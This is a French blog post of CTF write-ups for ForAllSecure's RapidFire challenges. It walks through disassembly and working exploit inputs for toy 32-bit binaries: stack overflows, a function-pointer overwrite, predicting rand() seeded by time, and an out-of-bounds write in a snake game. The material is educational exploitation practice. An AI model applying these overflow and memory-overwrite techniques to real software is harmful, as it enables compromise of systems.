# Solutions du CTF RapidFire de ForAllSecure

Dans [un billet sur leur blog](https://blog.forallsecure.com/2016/05/24/live-streaming-security-games/), la compagnie *ForAllSecure* présentait la vidéo d'un CTF de leur création baptisé *Rapid Fire*.  

Ce CTF a la particularité d'être filmé en temps réel, comme pour une compétition sportive.  

Pour donner une certaine cadence à ce CTF et éviter que la vidéo soit ennuyeuse les épreuves proposées sont simples et peuvent être résolues rapidement (d'où le nom du CTF).  

Ici pas de stack protector sur les binaires et pas non plus d'injection de shellcode à faire : il faut seulement provoquer l'appel de la fonction *execute\_me* présente dans les binaires. Du coup on a pas à se soucier non plus de l'ASLR ou d'une éventuelle stack non exécutable. Parfait pour tous ceux qui souhaitent débuter dans l'exploitation.  

Lors de l'event *execute\_me* validait l'exercice. Ici elle affichera seulement *Awesome*.  

Quoiqu'il en soit voir une partie de la vidéo m'a donné envie de mettre en pause et de solutionner moi même les exercices. Après demande express sur le blog, ceux-ci ont fournit [un lien Github](https://github.com/ForAllSecure/c2c-rapidfire-challenges) sur lequel retrouver les binaires et les sources.  

On évitera évidement de regarder les sources si on veut vraiment profiter du challenge déjà simple surtout que contrairement aux participants de l'événement on a pas la pression du temps et de la caméra :)  

Semi finales
------------

### Overflow

On débute avec le programme baptisé *overflow* (Merci *Captain Obvious*).  

```plain
$ ./overflow 
Usage: ./overflow your_name
```

L'overflow est simple à provoquer :  

```plain
$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Erreur de segmentation
```

On récupère l'adresse de *execute\_me* avec nm :  

```plain
$ nm overflow | grep execute_me
080484ad T execute_me
```

```plain
$ ./overflow `python -c "print '\xad\x84\x04\x08'*10"`
Hello ����������!
Erreur de segmentation
```

Il ne reste qu'à trouver le bon alignement :  

```plain
$ ./overflow A`python -c "print '\xad\x84\x04\x08'*10"`
Hello A����������!
Erreur de segmentation
$ ./overflow AA`python -c "print '\xad\x84\x04\x08'*10"`
Hello AA����������!
Awesome!
Awesome!
Awesome!
Awesome!
Erreur de segmentation
```

### RapidReversing

```plain
$ ./rapidreversing 
Give me one arg!
$ ./rapidreversing abcd
Nope.
```

Le code assembleur qui nous intéresse (ici désassemblé avec *radare2*) dans le main() est le suivant :  

```asm
 `-> 0x08048372    8b450c       mov eax, dword [ebp + 0xc] ; [:4]=0
     0x08048375    c74424080a0. mov dword [esp + 8], 0xa ; [:4]=0
     0x0804837d    c7442404000. mov dword [esp + 4], 0 ; [:4]=0x10100
     0x08048385    8b4004       mov eax, dword [eax + 4] ; [:4]=0x10100
     0x08048388    890424       mov dword [esp], eax
     0x0804838b    e8b0ffffff   call sym.imp.strtol
        sym.imp.strtol()
     0x08048390    8944241c     mov dword [esp + 0x1c], eax ; [:4]=52
     0x08048394    8b54241c     mov edx, dword [esp + 0x1c] ; [:4]=52
     0x08048398    8b44241c     mov eax, dword [esp + 0x1c] ; [:4]=52
     0x0804839c    c1e20b       shl edx, 0xb
     0x0804839f    c1e815       shr eax, 0x15
     0x080483a2    09d0         or eax, edx
     0x080483a4    8944241c     mov dword [esp + 0x1c], eax ; [:4]=52
     0x080483a8    8b44241c     mov eax, dword [esp + 0x1c] ; [:4]=52
     0x080483ac    3dcefaedfe   cmp eax, 0xfeedface
,==< 0x080483b1    7410         je 0x80483c3
|    0x080483b3    c704249a850. mov dword [esp], str.Nope.
|    0x080483ba    e851ffffff   call sym.imp.puts ; (fcn.0804830c)
|       fcn.0804830c() ; sym.imp.puts
|    0x080483bf    31c0         xor eax, eax
|    0x080483c1    c9           leave
|    0x080483c2    c3           ret
|    ; JMP XREF from 0x080483b1 (unk)
`--> 0x080483c3    c7042480850. mov dword [esp], str.Awesome_
     0x080483ca    e841ffffff   call sym.imp.puts ; (fcn.0804830c)
```

On voit ici un appel à strtol() pour convertir la chaîne que l'on passe en long (vous aurez remarqué au passage que le binaire est en 32bits donc un long tient sur 4 octets).  

La valeur obtenue est placée dans edx et eax aux adresses 0x08048394 et 0x08048398 respectivement. Puis une opération est faite qui équivaut à :  

```python
(X << 11) | (X >> 21)
```

Ceci correspond à un ROL de 11 bits (ou un ROR de 21) puisque 21 + 11 = 32. Tous les bits sont bien conservés.  

Le résultat est comparé ensuite à la valeur 0xfeedface. La solution la plus simple est de faire l'opération inverse :  

```python
>>> ((0xfeedface >> 11) | (0xfeedface << 21)) & 0xFFFFFFFF
1507843519
```

Et ça passe :  

```plain
$ ./rapidreversing 1507843519
Awesome!
```

On peut aussi utiliser la représentation binaire de 0xfeedface et jouer avec les caractères (plus compliqué au final) :  

```python
>>> bits = bin(0xfeedface)[2:].rjust(32, "0")
>>> int(bits[21:] + bits[:21], 2)
1507843519
```

### One in a million

```plain
$ ./one_in_a_million
Guess the number.
666
Nope, the answer was 274001
$ ./one_in_a_million 
Guess the number.
37337
Nope, the answer was 236604
```

Un *ltrace* nous donne quelques informations intéressantes :  

```plain
$ ltrace ./one_in_a_million
__libc_start_main([ "./one_in_a_million" ] <unfinished ...>
time(nil)                                                                = 1464706080
srand(1464706080)                                                        = <void>
puts("Guess the number."Guess the number.
)                                                                        = 18
__isoc99_scanf(0x80486db, 0xffbb70ac, 0xffbb82a1, 0x644f666
)                                                                        = 1
rand()                                                                   = 970397606
__printf_chk(1, 0x80486de, 0x61126, 0x61126Nope, the answer was 397606
)                                                                        = 28
+++ exited (status 0) +++
```

A première vue on a donc un rand() à deviner avec un srand() initialisé à time(NULL).  

Mais après désassemblage il y a une étape supplémentaire :  

```asm
0x080484d7    e874ffffff   call sym.imp.rand                                                                                                                                                                                      
   sym.imp.rand()                                                                                                                                                                                                                 
0x080484dc    8945e8       mov dword [ebp - 0x18], eax                                                                                                                                                                            
0x080484df    c745ec40420. mov dword [ebp - 0x14], 0xf4240                                                                                                                                                                        
0x080484e6    83c410       add esp, 0x10                                                                                                                                                                                          
0x080484e9    8b45e8       mov eax, dword [ebp - 0x18]                                                                                                                                                                            
0x080484ec    8b4dec       mov ecx, dword [ebp - 0x14]                                                                                                                                                                            
0x080484ef    99           cdq                                                                                                                                                                                                    
0x080484f0    f7f9         idiv ecx
```

On voit que le résultat de rand() est divisé par 1000000 (0xf4240) d'où le nom de l'exercice.  

Pour obtenir le même résultat il faut simplement le calculer au même moment :  

```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  char buff[64];
  int rand_value;

  srand(time(NULL));
  rand_value = rand() % 1000000;
  printf("%d\n", rand_value);
  return 0;
}
```

```plain
$ ./gen | ./one_in_a_million 
Guess the number.
Awesome!
```

### Firefault

Le programme lit du texte depuis l'entrée standard et nous le renvoie préfixé :  

```plain
$ ./firefault
Hi there !
Hi Hi there !!
$ ./firefault
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Erreur de segmentation
$ nm firefault | grep execute_me
0804847d T execute_me
```

```asm
/ (fcn) sym.main 87
|          0x08048490    55           push ebp
|          0x08048491    89e5         mov ebp, esp
|          0x08048493    83e4f0       and esp, 0xfffffff0
|          0x08048496    83ec40       sub esp, 0x40
|          0x08048499    c744243c2ca. mov dword [esp + 0x3c], sym.done ; [:4]=0x8048034 ; '<'
|          0x080484a1    8d44241c     lea eax, dword [esp + 0x1c]
|          0x080484a5    890424       mov dword [esp], eax
|          0x080484a8    e893feffff   call sym.imp.gets
|             sym.imp.gets(unk)
|          0x080484ad    8b44243c     mov eax, dword [esp + 0x3c] ; [:4]=0x8048034 ; '<'
|          0x080484b1    c70001000000 mov dword [eax], 1
|          0x080484b7    8d44241c     lea eax, dword [esp + 0x1c]
|          0x080484bb    89442404     mov dword [esp + 4], eax ; [:4]=0x10100
|          0x080484bf    c7042489850. mov dword [esp], str.Hi__s__n
|          0x080484c6    e865feffff   call sym.imp.printf ; (fcn.0804832c)
|             fcn.0804832c() ; sym.imp.printf
|          0x080484cb    a12ca00408   mov eax, dword [sym.done] ; [:4]=0x62552820 ; " (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4" @ 0x804a02c
|          0x080484d0    85c0         test eax, eax
|      ,=< 0x080484d2    750c         jne 0x80484e0
|      |   0x080484d4    c7042491850. mov dword [esp], str.what_
|      |   0x080484db    e870feffff   call sym.imp.puts
|      |      sym.imp.puts()
|      |   ; JMP XREF from 0x080484d2 (unk)
|      `-> 0x080484e0    b800000000   mov eax, 0
|          0x080484e5    c9           leave
\          0x080484e6    c3           ret
```

Le main() réserve 64 octets sur la stack (0x40). On voit bien l'utilisation de la fonction gets() connue pour être dangereuse.  

Le résultat du gets() est stocké à esp+0x1c (esp+28) et un pointeur sur entier est stocké à esp+0x3c (60).  

Par conséquent si on écrase et déborde le buffer on atteint bien la valeur de retour mais on écrase aussi le pointeur sur entier qui est sensé correspondre à une zone mémoire écrivable (puisque le programme tente d'y écrire 1 à l'instruction 0x080484b1).  

Si ce n'est pas le cas le programme segfault et l'exploitation tombe à l'eau.  

La problématique reflète bien des cas que l'on peut trouver dans la réalité, en particulier si un shellcode doit être placé dans un protocole réseau ou un format de fichier.  

On pourrait trouver différentes adresses écrivables mais on va simplement réécrire la valeur qui était affecté au pointeur.  

```plain
[0x08048380]> ? sym.done
134520876 0x804a02c 01001120054 128.3M 804000:002c 134520876 00101100 134520876.0 0.000000
```

```plain
$ python -c "print '\x2c\xa0\x04\x08' * 12 + '\x7d\x84\x04\x08'" | ./firefault
Hi ,,,,,,,,,,,,}!
Awesome!
Erreur de segmentation
```

Finale
------

### Firebird

```plain
$ ./firebird 
Usage: ./firebird <address to write to> <value to write there>
$ ./firebird ABCD EFGH
Value being written: 48474645
Address being written to: 44434241
Erreur de segmentation
$ nm firebird | grep execute_me
0804844d T execute_me
```

Dans le code assembleur on trouve un pointeur sur fonction qu'il nous suffira d'écraser :  

```asm
0x080484ee    a124a00408   mov eax, dword [sym.printer] ; [:4]=0x8048461 ; "a...GCC: (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4" @ 0x804a024
0x080484f3    ffd0         call eax
```

```plain
$ ./firebird `python -c "print('\x24\xa0\x04\x08')"` `python -c "print('\x4d\x84\x04\x08')"`
Value being written: 804844d
Address being written to: 804a024
Awesome!
```

### Firetruck

```plain
$ ./firetruck 
./firetruck string
$ ./firetruck ABCD
That's not the best truck
```

Ni *ltrace* ni *strace* ne nous sont utiles. On retourne une fois de plus sur *radare2*.

```asm
  `-> 0x0804850b    8b450c       mov eax, dword [ebp + 0xc] ; [:4]=0
      0x0804850e    83c004       add eax, 4
      0x08048511    8b00         mov eax, dword [eax]
      0x08048513    8b00         mov eax, dword [eax]
      0x08048515    3d69636563   cmp eax, 0x63656369
 ,==< 0x0804851a    7418         je 0x8048534
 |    0x0804851c    c704241d860. mov dword [esp], str.That_s_not_the_best_truck
 |    0x08048523    e848feffff   call sym.imp.puts
 |       sym.imp.puts()
 |    0x08048528    c7042401000. mov dword [esp], 1
 |    0x0804852f    e85cfeffff   call sym.imp.exit
 |       sym.imp.exit()
 |    ; JMP XREF from 0x0804851a (unk)
 `--> 0x08048534    8b450c       mov eax, dword [ebp + 0xc] ; [:4]=0
      0x08048537    83c004       add eax, 4
      0x0804853a    8b00         mov eax, dword [eax]
      0x0804853c    83c004       add eax, 4
      0x0804853f    8b00         mov eax, dword [eax]
      0x08048541    3d7265616d   cmp eax, 0x6d616572
,===< 0x08048546    7418         je 0x8048560
|     0x08048548    c704241d860. mov dword [esp], str.That_s_not_the_best_truck
|     0x0804854f    e81cfeffff   call sym.imp.puts
|        sym.imp.puts()
|     0x08048554    c7042401000. mov dword [esp], 1
|     0x0804855b    e830feffff   call sym.imp.exit
|        sym.imp.exit()
|     ; JMP XREF from 0x08048546 (unk)
`---> 0x08048560    e847ffffff   call sym.execute_me
```

On voit que 4 premiers octets sont comparés à une valeur puis les 4 qui suivent à une autre valeur.  

```python
>>> import struct
>>> struct.pack("II", 0x63656369, 0x6d616572)
'icecream'
```

```plain
$  ./firetruck icecream
Awesome!
```

Aditionnellement un simple strings pourrait permettre de résoudre l'exercice :  

```plain
$ strings firetruck
/lib/ld-linux.so.2
g$Ui
__gmon_start__
libc.so.6
_IO_stdin_used
exit
puts
stderr
fwrite
__libc_start_main
GLIBC_2.0
PTRh
=icect
=reamt
[^_]
Awesome!
./firetruck string
That's not the best truck
;*2$"
```

### Charmeleon

```plain
$ ./charmeleon 
Usage: ./charmeleon magic_bytes
$ ./charmeleon ABCD
I got 0x44434241. That's not the bytes I was thinking of
```

Il s'agit d'une simple comparaison :  

```asm
0x080484d2    8b450c       mov eax, dword [ebp + 0xc] ; [:4]=0
0x080484d5    83c004       add eax, 4
0x080484d8    8b00         mov eax, dword [eax]
0x080484da    8b00         mov eax, dword [eax]
0x080484dc    8944241c     mov dword [esp + 0x1c], eax ; [:4]=52
0x080484e0    817c241c39b. cmp dword [esp + 0x1c], 0xf24ab039 ; [:4]=52
0x080484e8    7507         jne 0x80484f1
0x080484ea    e88effffff   call sym.execute_me
```

```plain
$ ./charmeleon `python -c "print '\x39\xb0\x4a\xf2'"`
Awesome!
```

### Snaaaake

Le programme snaaaake prend un nom d'utilisateur en argument. Comme on peut s'y attendre il s'agit d'un jeu de type snake en version plus qu'alpha.  

Le programme se base sur ncurses et affiche un cadre de 16 \* 16 caractères. On s'apperçoit vite en jouant avec qu'il gère mal les déplacements verticaux qui peuvent provoquer un segfault.  

L'interface ressemble à ceci :  

```plain
 ------------------
 |                |
 |                |
 |                |
 |                |
 |                |
 |                |
 |                |
 |                |
 |      ABCD      |
 |                |
 |                |
 |                |
 |                |
 |                |
 |                |
 |                |
 ------------------

 *WASD to play, Q to quit*
     **EARLY ALPHA**
      ***HAS BUGS***
```

Voici le code assembleur du main() :  

```asm
     ;-- sym.main:
     0x08048e7f    55           push ebp
     0x08048e80    89e5         mov ebp, esp
     0x08048e82    57           push edi
     0x08048e83    83e4f0       and esp, 0xfffffff0
     0x08048e86    81ec10010000 sub esp, 0x110
     0x08048e8c    837d0802     cmp dword [ebp + 8], 2 ; [:4]=0
 ,=< 0x08048e90    7405         je 0x8048e97
 |   0x08048e92    e8b4ffffff   call sym.usage
 |      sym.usage(unk, unk)
 |   ; JMP XREF from 0x08048e90 (unk)
 `-> 0x08048e97    8b450c       mov eax, dword [ebp + 0xc] ; [:4]=0
     0x08048e9a    8b5004       mov edx, dword [eax + 4] ; [:4]=0x10100
     0x08048e9d    891560b00408 mov dword [sym.player_name], edx ; [:4]=0x8048f00 ; sym.player_name
     0x08048ea3    89d7         mov edi, edx
     0x08048ea5    b800000000   mov eax, 0
     0x08048eaa    b9ffffffff   mov ecx, sym.imp._ITM_registerTMCloneTable ; sym.imp._ITM_registerTMCloneTable
     0x08048eaf    f2ae         repne scasb al, byte es:[edi]
     0x08048eb1    f7d1         not ecx
     0x08048eb3    83e901       sub ecx, 1
     0x08048eb6    83f920       cmp ecx, 0x20
,==< 0x08048eb9    7604         jbe 0x8048ebf
|    0x08048ebb    c6422000     mov byte [edx + 0x20], 0 ; [:1]=0
|    ; JMP XREF from 0x08048eb9 (unk)
`--> 0x08048ebf    e8cffaffff   call sym.curses_setup
|  >    sym.curses_setup()
     0x08048ec4    8d442410     lea eax, dword [esp + 0x10]
     0x08048ec8    890424       mov dword [esp], eax
     0x08048ecb    e824feffff   call sym.play_game ; (sym.keyboard_move)
        sym.keyboard_move() ; sym.play_game
     0x08048ed0    e8f5faffff   call sym.curses_cleanup
        sym.curses_cleanup()
     0x08048ed5    b800000000   mov eax, 0
     0x08048eda    8b7dfc       mov edi, dword [ebp - 4]
     0x08048edd    c9           leave
     0x08048ede    c3           ret
```

On remarque que 272 octets sont réservés sur la pile. Plus tard il passe à *play\_game* l'adresse d'une zone mémoire à esp+0x10 (esp+16). Or 272 - 16 = 256 soit notre tableau de 16 \* 16 octets.  

Je ne mettrais pas la totalité du code assembleur de *play\_game* mais voici ce qui se passe globalement :  

1. récupèration de l'adresse du tableau depuis la pile
2. remplissage avec des espaces
3. insertion via memcpy() du nom du joueur au milieu du tableau

Suit ensuite une boucle dont le fonctionnement est le suivant :  

1. *draw()* affiche le tableau à l'aide des fonctions ncurses
2. *keyboard\_move* est appelé pour lire une touche du clavier
3. le tableau est réécrit en utilisant à nouveau memcpy() pour placer le nom du joueur aux nouvelles coordonnées

En observant les crashs (via gdb ou simplement via dmesg) on note que c'est ce dernier memcpy() qui est faillible.  

Le code qui nous intéresse est le suivant :  

```asm
0x08048e19    8b44241c     mov eax, dword [esp + 0x1c] ; ici on a les ordonnées (y) du serpent
0x08048e1d    c1e004       shl eax, 4                  ; multiplication par 16 (soit une ligne)
0x08048e20    01d8         add eax, ebx                ; ebx = début du tableau
0x08048e22    03442418     add eax, dword [esp + 0x18] ; ajout des abscisses (x)
0x08048e26    894c2408     mov dword [esp + 8], ecx    ; ecx = longueur du username
0x08048e2a    89542404     mov dword [esp + 4], edx    ; edx = username
0x08048e2e    890424       mov dword [esp], eax        ; eax = adresse où copier le username
0x08048e31    e83af9ffff   call sym.imp.memcpy
```

*keyboard\_move* ajoute 1 aux ordonnées si on se déplace vers le bas et 1 aux abscisses si on va à droite.  

Aucune vérification n'a été faite sur la sortie du tableau par conséquent l'idée est de définir l'adresse d'*execute\_me* comme username, de nous positionner en dehors du tableau vers le bas pour écraser ce qu'il y a après (c'est à dire l'adresse de retour du main() car le tableau est réservé dedans) puis de quitter le jeu avec 'q' pour sortir de la boucle de *play\_game* pour attendre l'instruction ret à l'adresse 0x08048ede.  

Il faut bien voir qu'à chaque déplacement memcpy() est appelé donc on écrase à chaque fois au moins un dword (ou plus en fonction de la longueur du username, tronqué à 32 caractères).  

A nous de ne pas aller trop loin dans l'écrasement de la mémoire pour ne pas obtenir un résultat inattendu.  

Dans la pratique il m'aura suffit de remplir une ligne avec l'adresse d'*execute\_me* répétée 4 fois puis de descendre seulement 1 ligne en dehors du tableau avant de quitter :  

```plain
$ ./snaaaake `python -c "print '\x80\x89\x04\x08'*4"`
Awesome!
Erreur de segmentation
```


*Published June 01 2016 at 11:54*